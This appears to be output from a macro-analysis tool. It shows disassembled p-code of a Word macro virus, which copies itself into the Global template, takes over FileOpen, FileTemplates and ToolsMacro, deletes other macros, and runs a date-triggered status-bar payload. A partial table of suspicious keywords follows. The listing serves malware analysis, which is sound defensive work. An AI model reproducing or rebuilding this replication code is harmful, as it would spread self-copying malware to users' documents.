' 	ArgsMemCall Organizer 0x0005 
' Line #160:
' 	Label tf2 
' Line #161:
' 	ElseBlock 
' Line #162:
' 	Ld False$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld i 
' 	ArgsLd TM__$ 0x0001 
' 	Add 
' 	St FM$ 
' Line #163:
' 	Ld xg$ 
' 	Ld i 
' 	ArgsLd SM__$ 0x0001 
' 	Add 
' 	St GM$ 
' Line #164:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError tf3 
' Line #165:
' 	Ld GM$ 
' 	Ld FM$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #166:
' 	Label tf3 
' Line #167:
' 	EndIfBlock 
' Line #168:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #169:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #170:
' 	EndSub 
' Line #171:
' Line #172:
' 	FuncDefn (Private Sub CheckGlobal())
' Line #173:
' 	Dim 
' 	VarDefn r
' Line #174:
' 	Dim 
' 	VarDefn x
' Line #175:
' 	Dim 
' 	VarDefn i
' Line #176:
' 	Dim 
' 	VarDefn MN
' Line #177:
' 	Dim 
' 	VarDefn MD
' Line #178:
' 	Dim 
' 	VarDefn cmn
' Line #179:
' 	Dim 
' 	VarDefn j
' Line #180:
' 	LitDI2 0x0000 
' 	St r 
' Line #181:
' 	LitDI2 0x0000 
' 	St x 
' Line #182:
' 	Ld cn 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #183:
' 	ArgsCall TularGlobal 0x0000 
' Line #184:
' 	GoTo cg1 
' Line #185:
' 	EndIfBlock 
' Line #186:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld cn 
' 	For 
' Line #187:
' 	Ld tj$ 
' 	LitStr 0x0003 "zxz"
' 	Eq 
' 	IfBlock 
' Line #188:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	St MN$ 
' Line #189:
' 	ElseBlock 
' Line #190:
' 	Ld i 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0004 
' 	St MN$ 
' Line #191:
' 	EndIfBlock 
' Line #192:
' 	Ld MN$ 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroDesc$] 0x0001 
' 	St MD$ 
' Line #193:
' 	Ld MD$ 
' 	ArgsLd Tes 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #194:
' 	Ld MN$ 
' 	Ld xe$ 
' 	Eq 
' 	Ld MN$ 
' 	Ld xf$ 
' 	Eq 
' 	Or 
' 	Ld MN$ 
' 	Ld xt$ 
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	Ld r 
' 	LitDI2 0x0001 
' 	Add 
' 	St r 
' 	EndIf 
' Line #195:
' 	EndIfBlock 
' Line #196:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #197:
' 	Label cg1 
' Line #198:
' 	LitDI2 0x0000 
' 	St x 
' Line #199:
' 	LitDI2 0x0000 
' 	St gd 
' Line #200:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	St cmn 
' Line #201:
' 	OptionBase 
' 	Ld cmn 
' 	Redim sp__$ 0x0001 (As String)
' Line #202:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld cmn 
' 	For 
' Line #203:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	St MN$ 
' Line #204:
' 	Ld MN$ 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroDesc$] 0x0001 
' 	St MD$ 
' Line #205:
' 	Ld MD$ 
' 	ArgsLd Tes 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #206:
' 	Ld MN$ 
' 	Ld xc$ 
' 	Eq 
' 	Ld MN$ 
' 	Ld xm$ 
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	Ld gd 
' 	LitDI2 0x0001 
' 	Add 
' 	St gd 
' 	EndIf 
' Line #207:
' 	ElseBlock 
' Line #208:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Add 
' 	St x 
' Line #209:
' 	Ld x 
' 	St ww 
' Line #210:
' 	Ld MN$ 
' 	Ld x 
' 	ArgsSt sp__$ 0x0001 
' Line #211:
' 	EndIfBlock 
' Line #212:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #213:
' 	Ld x 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #214:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	For 
' Line #215:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError cg2 
' Line #216:
' 	Ld j 
' 	ArgsLd sp__$ 0x0001 
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Show 
' 	LitDI2 0x0001 
' 	ParamNamed Delete 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsMacro 0x0003 
' Line #217:
' 	Label cg2 
' Line #218:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #219:
' 	EndIfBlock 
' Line #220:
' 	Ld r 
' 	LitDI2 0x0003 
' 	Ne 
' 	Ld cn 
' 	LitDI2 0x0000 
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ArgsCall TularGlobal 0x0000 
' 	EndIf 
' Line #221:
' 	Ld gd 
' 	LitDI2 0x0002 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Gandakan 0x0000 
' 	EndIf 
' Line #222:
' 	ArgsCall Tutup 0x0000 
' Line #223:
' 	Label cg3 
' Line #224:
' 	EndSub 
' Line #225:
' Line #226:
' 	FuncDefn (Private Sub TularGlobal())
' Line #227:
' 	Dim 
' 	VarDefn i
' Line #228:
' 	Dim 
' 	VarDefn FM
' Line #229:
' 	Dim 
' 	VarDefn GM
' Line #230:
' 	Ld ww 
' 	LitDI2 0x0001 
' 	Add 
' 	St ww 
' Line #231:
' 	OptionBase 
' 	LitDI2 0x0004 
' 	Redim SM__$ 0x0001 (As String)
' Line #232:
' 	OptionBase 
' 	LitDI2 0x0004 
' 	Redim TM__$ 0x0001 (As String)
' Line #233:
' 	Ld FM1$ 
' 	LitDI2 0x0001 
' 	ArgsSt SM__$ 0x0001 
' Line #234:
' 	Ld FM3$ 
' 	LitDI2 0x0002 
' 	ArgsSt SM__$ 0x0001 
' Line #235:
' 	Ld FM2$ 
' 	LitDI2 0x0003 
' 	ArgsSt SM__$ 0x0001 
' Line #236:
' 	Ld FM3$ 
' 	LitDI2 0x0004 
' 	ArgsSt SM__$ 0x0001 
' Line #237:
' 	Ld xe$ 
' 	LitDI2 0x0001 
' 	ArgsSt TM__$ 0x0001 
' Line #238:
' 	Ld xf$ 
' 	LitDI2 0x0002 
' 	ArgsSt TM__$ 0x0001 
' Line #239:
' 	Ld xt$ 
' 	LitDI2 0x0003 
' 	ArgsSt TM__$ 0x0001 
' Line #240:
' 	LitStr 0x0004 "Show"
' 	LitDI2 0x0004 
' 	ArgsSt TM__$ 0x0001 
' Line #241:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #242:
' 	Ld tj$ 
' 	LitStr 0x0003 "zxz"
' 	Ne 
' 	IfBlock 
' Line #243:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError tg1 
' Line #244:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #245:
' 	LitDI2 0x0001 
' 	ParamNamed Rename 
' 	Ld False$ 
' 	ParamNamed Source 
' 	Ld i 
' 	ArgsLd SM__$ 0x0001 
' 	ParamNamed New 
' 	Ld i 
' 	ArgsLd TM__$ 0x0001 
' 	ParamNamed NewName 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0005 
' Line #246:
' 	LitDI2 0x0001 
' 	ParamNamed Copy 
' 	Ld False$ 
' 	ParamNamed Source 
' 	Ld tj$ 
' 	ParamNamed Destination 
' 	Ld i 
' 	ArgsLd TM__$ 0x0001 
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0005 
' Line #247:
' 	LitDI2 0x0001 
' 	ParamNamed Rename 
' 	Ld False$ 
' 	ParamNamed Source 
' 	Ld i 
' 	ArgsLd TM__$ 0x0001 
' 	ParamNamed New 
' 	Ld i 
' 	ArgsLd SM__$ 0x0001 
' 	ParamNamed NewName 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0005 
' Line #248:
' 	ElseBlock 
' Line #249:
' 	LitDI2 0x0001 
' 	ParamNamed Copy 
' 	Ld False$ 
' 	ParamNamed Source 
' 	Ld tj$ 
' 	ParamNamed Destination 
' 	Ld i 
' 	ArgsLd SM__$ 0x0001 
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0005 
' Line #250:
' 	LitDI2 0x0001 
' 	ParamNamed Rename 
' 	Ld tj$ 
' 	ParamNamed Source 
' 	Ld i 
' 	ArgsLd SM__$ 0x0001 
' 	ParamNamed New 
' 	Ld i 
' 	ArgsLd TM__$ 0x0001 
' 	ParamNamed NewName 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0005 
' Line #251:
' 	EndIfBlock 
' Line #252:
' 	Label tg1 
' Line #253:
' 	ElseBlock 
' Line #254:
' 	Ld False$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld i 
' 	ArgsLd SM__$ 0x0001 
' 	Add 
' 	St FM$ 
' Line #255:
' 	Ld xg$ 
' 	Ld i 
' 	ArgsLd TM__$ 0x0001 
' 	Add 
' 	St GM$ 
' Line #256:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError tg2 
' Line #257:
' 	Ld FM$ 
' 	Ld GM$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #258:
' 	Label tg2 
' Line #259:
' 	EndIfBlock 
' Line #260:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #261:
' 	Label tg3 
' Line #262:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall SetTemplateDirty 0x0001 
' Line #263:
' 	EndSub 
' Line #264:
' Line #265:
' 	FuncDefn (Private Sub Gandakan())
' Line #266:
' 	Dim 
' 	VarDefn FM
' Line #267:
' 	Dim 
' 	VarDefn i
' Line #268:
' 	Ld FM2$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo g2 
' 	EndIf 
' Line #269:
' 	OptionBase 
' 	LitDI2 0x0002 
' 	Redim TM__$ 0x0001 (As String)
' Line #270:
' 	Ld xg$ 
' 	Ld xc$ 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsSt TM__$ 0x0001 
' Line #271:
' 	Ld xg$ 
' 	Ld xm$ 
' 	Add 
' 	LitDI2 0x0002 
' 	ArgsSt TM__$ 0x0001 
' Line #272:
' 	Ld False$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld FM2$ 
' 	Add 
' 	St FM$ 
' Line #273:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	For 
' Line #274:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError g1 
' Line #275:
' 	Ld FM$ 
' 	Ld i 
' 	ArgsLd TM__$ 0x0001 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #276:
' 	Label g1 
' Line #277:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #278:
' 	Label g2 
' Line #279:
' 	LitDI2 0x0002 
' 	St gd 
' Line #280:
' 	Ld gd 
' 	St ww 
' Line #281:
' 	EndSub 
' Line #282:
' Line #283:
' 	FuncDefn (Private Sub Aksi())
' Line #284:
' 	Dim 
' 	VarDefn th
' Line #285:
' 	Dim 
' 	VarDefn bl
' Line #286:
' 	Dim 
' 	VarDefn w
' Line #287:
' 	Dim 
' 	VarDefn z
' Line #288:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Year 0x0001 
' 	St th 
' Line #289:
' 	Ld th 
' 	LitDI2 0x07CE 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo a2 
' 	EndIf 
' Line #290:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Month 0x0001 
' 	St bl 
' Line #291:
' 	Ld bl 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld bl 
' 	LitDI2 0x0002 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #292:
' 	Ld th 
' 	LitDI2 0x07CE 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo a2 
' 	EndIf 
' Line #293:
' 	EndIfBlock 
' Line #294:
' 	LitStr 0x0004 "Emc2"
' 	LitStr 0x0001 "E"
' 	Ld WordBasic 
' 	ArgsMemLd [GetProfileString$] 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd Val 0x0001 
' 	St w 
' Line #295:
' 	Ld w 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Str 0x0001 
' 	St z$ 
' Line #296:
' 	Ld w 
' 	LitDI2 0x0035 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo a1 
' 	EndIf 
' Line #297:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError a1 
' Line #298:
' 	LitStr 0x000C "Show_.Tampil"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #299:
' 	LitStr 0x0001 "1"
' 	St z$ 
' Line #300:
' 	Label a1 
' Line #301:
' 	LitStr 0x0004 "Emc2"
' 	LitStr 0x0001 "E"
' 	Ld z$ 
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #302:
' 	Label a2 
' Line #303:
' 	EndSub 
' Line #304:
' Line #305:
' 	FuncDefn (Private Sub Tutup())
' Line #306:
' 	Dim 
' 	VarDefn i
' Line #307:
' 	LitDI2 0x0001 
' 	St i 
' Line #308:
' 	Ld i 
' 	Ld WordBasic 
' 	ArgsMemLd CountWindows 0x0000 
' 	Le 
' 	While 
' Line #309:
' 	Ld i 
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0001 
' 	LitStr 0x000A "NARMOL.DOT"
' 	Eq 
' 	IfBlock 
' Line #310:
' 	LitStr 0x000A "NARMOL.DOT"
' 	Ld WordBasic 
' 	ArgsMemCall Activate 0x0001 
' Line #311:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #312:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall FileClose 0x0001 
' Line #313:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #314:
' 	Ld CountWindow 
' 	St i 
' Line #315:
' 	LitDI2 0x0000 
' 	ParamNamed RecentFiles 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsGeneral 0x0001 
' Line #316:
' 	LitDI2 0x0001 
' 	ParamNamed RecentFiles 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsGeneral 0x0001 
' Line #317:
' 	LitDI2 0x0005 
' 	ParamNamed RecentFileCount 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsGeneral 0x0001 
' Line #318:
' 	EndIfBlock 
' Line #319:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #320:
' 	Wend 
' Line #321:
' 	EndSub 
' Line #322:
' Line #323:
' 	FuncDefn (Private Function Tes(MD))
' Line #324:
' 	Dim 
' 	VarDefn m
' Line #325:
' 	Ld MD$ 
' 	FnLen 
' 	LitDI2 0x0006 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0007 "pemalas"
' 	St MD$ 
' 	EndIf 
' Line #326:
' 	LitDI2 0x0000 
' 	St m 
' Line #327:
' 	Ld MD$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd Val 0x0001 
' 	LitDI2 0x0001 
' 	Ge 
' 	Ld MD$ 
' 	LitDI2 0x0005 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "."
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St m 
' 	EndIf 
' Line #328:
' 	Ld m 
' 	St Tes 
' Line #329:
' 	EndFunc 
' Line #330:
' Line #331:
' 	FuncDefn (Private Sub Singkat())
' Line #332:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x000A 
' 	Mul 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	St a 
' Line #333:
' 	LitDI2 0x0000 
' 	St ca 
' Line #334:
' 	LitDI2 0x0000 
' 	St cn 
' Line #335:
' 	LitDI2 0x0000 
' 	St ww 
' Line #336:
' 	LitStr 0x0000 ""
' 	St FM2$ 
' Line #337:
' 	LitStr 0x0000 ""
' 	St tj$ 
' Line #338:
' 	LitStr 0x0008 "AutoOpen"
' 	St xo$ 
' Line #339:
' 	LitStr 0x0009 "AutoClose"
' 	St xc$ 
' Line #340:
' 	LitStr 0x000D "FileTemplates"
' 	St xt$ 
' Line #341:
' 	LitStr 0x000A "ToolsMacro"
' 	St xm$ 
' Line #342:
' 	LitStr 0x0008 "FileOpen"
' 	St xf$ 
' Line #343:
' 	LitStr 0x0008 "Einstein"
' 	St xe$ 
' Line #344:
' 	LitStr 0x000A "narmol.dot"
' 	St xn$ 
' Line #345:
' 	LitStr 0x0007 "Global:"
' 	St xg$ 
' Line #346:
' 	EndSub 
' Line #347:
' Line #348:
' 	FuncDefn (Private Function pl(y))
' Line #349:
' 	Dim 
' 	VarDefn i
' Line #350:
' 	Dim 
' 	VarDefn s
' Line #351:
' 	Dim 
' 	VarDefn r
' Line #352:
' 	Dim 
' 	VarDefn x
' Line #353:
' 	OptionBase 
' 	LitDI2 0x0034 
' 	Redim c__$ 0x0001 (As String)
' Line #354:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001A 
' 	For 
' Line #355:
' 	LitDI2 0x0060 
' 	Ld i 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld i 
' 	LitDI2 0x001A 
' 	Add 
' 	ArgsSt c__$ 0x0001 
' Line #356:
' 	LitDI2 0x0040 
' 	Ld i 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld i 
' 	ArgsSt c__$ 0x0001 
' Line #357:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #358:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0007 
' 	Mul 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	LitDI2 0x0003 
' 	Add 
' 	St s 
' Line #359:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld s 
' 	For 
' Line #360:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0033 
' 	Mul 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	LitDI2 0x0001 
' 	Add 
' 	St r 
' Line #361:
' 	Ld x$ 
' 	Ld r 
' 	ArgsLd c__$ 0x0001 
' 	Add 
' 	St x$ 
' Line #362:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #363:
' 	Ld x$ 
' 	St pl$ 
' Line #364:
' 	EndFunc 
' Macros/VBA/UjXlPG - 1816 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn c
' Line #3:
' 	Dim 
' 	VarDefn i
' Line #4:
' 	Dim 
' 	VarDefn o
' Line #5:
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0003 
' 	St c 
' Line #6:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld c 
' 	For 
' Line #7:
' 	Ld i 
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0004 
' 	LitStr 0x0008 "Einstein"
' 	Eq 
' 	IfBlock 
' Line #8:
' 	LitDI2 0x0005 
' 	St o 
' Line #9:
' 	Ld c 
' 	St i 
' Line #10:
' 	EndIfBlock 
' Line #11:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #12:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError uh 
' Line #13:
' 	Ld o 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000D "Einstein.Main"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' 	EndIf 
' Line #14:
' 	Label uh 
' Line #15:
' 	EndSub 
' Macros/VBA/ijd - 4297 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #3:
' 	Dim 
' 	VarDefn fop (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileOpen 0x0001 
' 	Set fop 
' Line #4:
' 	Ld fop 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileOpen 0x0001 
' Line #5:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError owp 
' Line #6:
' 	Ld fop 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileOpen 0x0001 
' Line #7:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError owp 
' Line #8:
' 	Ld fop 
' 	Ld WordBasic 
' 	ArgsMemCall FileOpen 0x0001 
' Line #9:
' 	Dim 
' 	VarDefn fsa (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set fsa 
' Line #10:
' 	Ld fsa 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #11:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError owp 
' Line #12:
' 	Ld fsa 
' 	MemLd Format$ 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000D "Einstein.Main"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' 	EndIf 
' Line #13:
' 	Label owp 
' Line #14:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #15:
' 	EndSub 
' Line #16:
' Line #17:
' 	FuncDefn (Private Sub Tampil())
' Line #18:
' 	Dim 
' 	VarDefn u
' Line #19:
' 	Dim 
' 	VarDefn t
' Line #20:
' 	Dim 
' 	VarDefn l
' Line #21:
' 	Dim 
' 	VarDefn d
' Line #22:
' 	Dim 
' 	VarDefn v
' Line #23:
' 	Dim 
' 	VarDefn o
' Line #24:
' 	Dim 
' 	VarDefn s
' Line #25:
' 	Dim 
' 	VarDefn e
' Line #26:
' 	Dim 
' 	VarDefn i
' Line #27:
' 	Dim 
' 	VarDefn h
' Line #28:
' 	Dim 
' 	VarDefn j
' Line #29:
' 	Dim 
' 	VarDefn B
' Line #30:
' 	Dim 
' 	VarDefn c
' Line #31:
' 	LitDI2 0x00FF 
' 	ArgsLd Space 0x0001 
' 	St c$ 
' Line #32:
' 	LitR8 0x0000 0x0A37 0x7F31 0x4235 
' 	St u 
' Line #33:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Second 0x0001 
' 	St t 
' Line #34:
' 	Ld t 
' 	LitDI2 0x0039 
' 	Gt 
' 	IfBlock 
' Line #35:
' 	LitDI2 0x00FA 
' 	St l 
' Line #36:
' 	GoTo hh 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	Ld d 
' 	LitDI2 0x0002 
' 	Le 
' 	While 
' Line #39:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Second 0x0001 
' 	Ld t 
' 	Sub 
' 	St d 
' Line #40:
' 	Ld l 
' 	LitR8 0x999A 0x9999 0x9999 0x3FD9 
' 	Add 
' 	St l 
' Line #41:
' 	Wend 
' Line #42:
' 	Label hh 
' Line #43:
' 	LitR8 0x0000 0xFCF4 0xE976 0x4211 
' 	St v 
' Line #44:
' 	StartForVariable 
' 	Ld o 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0055 
' 	For 
' Line #45:
' 	Ld s$ 
' 	LitStr 0x0001 " "
' 	Add 
' 	St s$ 
' Line #46:
' 	StartForVariable 
' 	Ld o 
' 	EndForVariable 
' 	NextVar 
' Line #47:
' 	Ld v 
' 	ArgsLd Str 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [LTrim$] 0x0001 
' 	Ld u 
' 	ArgsLd Str 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [LTrim$] 0x0001 
' 	Add 
' 	St e$ 
' Line #48:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x002B 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #49:
' 	Ld i 
' 	LitDI2 0x0002 
' 	Add 
' 	Paren 
' 	LitDI2 0x0004 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld e$ 
' 	Ld i 
' 	LitDI2 0x0002 
' 	Div 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	Ld WordBasic 
' 	ArgsMemLd Val 0x0001 
' 	LitDI2 0x0032 
' 	Add 
' 	Paren 
' 	St h 
' 	Else 
' 	BoSImplicit 
' 	LitDI2 0x005A 
' 	St h 
' 	EndIf 
' Line #50:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0041 
' 	Ld h 
' 	For 
' Line #51:
' 	Ld j 
' 	ArgsLd Chr 0x0001 
' 	St B$ 
' Line #52:
' 	Ld s$ 
' 	Ld c$ 
' 	Add 
' 	Ld B$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall PrintStatusBar 0x0001 
' Line #53:
' 	Ld l 
' 	Paren 
' 	ArgsCall tn 0x0001 
' Line #54:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #55:
' 	Ld i 
' 	LitDI2 0x0002 
' 	Add 
' 	Paren 
' 	LitDI2 0x0004 
' 	Mod 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 " "
' 	St B$ 
' 	EndIf 
' Line #56:
' 	Ld c$ 
' 	Ld B$ 
' 	Add 
' 	St c$ 
' Line #57:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #58:
' 	Ld l 
' 	LitDI2 0x000A 
' 	Mul 
' 	ArgsCall tn 0x0001 
' Line #59:
' 	Ld WordBasic 
' 	ArgsMemCall Beep 0x0000 
' Line #60:
' 	EndSub 
' Line #61:
' Line #62:
' 	FuncDefn (Private Sub tn(l))
' Line #63:
' 	Dim 
' 	VarDefn i
' Line #64:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld l 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	For 
' Line #65:
' 	StartForVariable 
' 	Next 
' Line #66:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AUTOCLOSE           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
